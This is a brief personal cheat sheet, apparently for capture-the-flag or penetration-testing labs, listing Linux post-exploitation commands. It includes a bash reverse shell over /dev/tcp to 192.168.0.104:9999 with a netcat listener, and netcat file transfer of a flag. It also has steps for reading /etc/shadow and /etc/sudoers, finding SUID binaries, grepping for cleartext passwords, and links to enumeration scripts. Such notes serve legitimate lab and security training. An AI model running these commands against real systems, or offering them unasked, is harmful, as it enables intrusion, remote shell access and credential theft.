__send file through netcat(listener)__

nc -lvnp port > flag.txt

__send file thru netcat (sender)__

nc -w 3 listener ip port < flag.txt

__python server__

( python3 -m http.server 192.168.0.104:8080 )

__interactive shell__

(python -c "import pty;pty.spawn('/bin/sh')")

__forwarding shell(victim)__

(bash -i >& /dev/tcp/192.168.0.104/9999 0>&1)

__forwarding shell(host)__

(nc -lvnp 9999)

__change from non interactive to interactive__

(*echo $SHELL (variable yg dh diset)*echo $TERM*export SHELL=/bin/bash*export TERM=xterm-256color*stty -a*stty raw -a)

__system/user info__

(uname -a, env, whoami, history, pwd -> searchsploit)

__check sudoers__ 

(sudo -l, cat /etc/sudoers)

__other super users__

( grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}')

__network info__

( ifconfig -a, netstat -antup, lsof -i)

__enum serv/softw__

( ps aux, ps -ef)

__SUID files__

(find / -perm -u=s -type f 2>/dev/null)

__pw hashes__

(cat /etc/shadow)

__check cleartxt cred__

(find . -type f -maxdepth 4 | xargs grep -i "password")

__reference__

_http://www.securitysift.com/download/linuxprivchecker.py_

_https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh_

_https://gtfobins.github.io/_

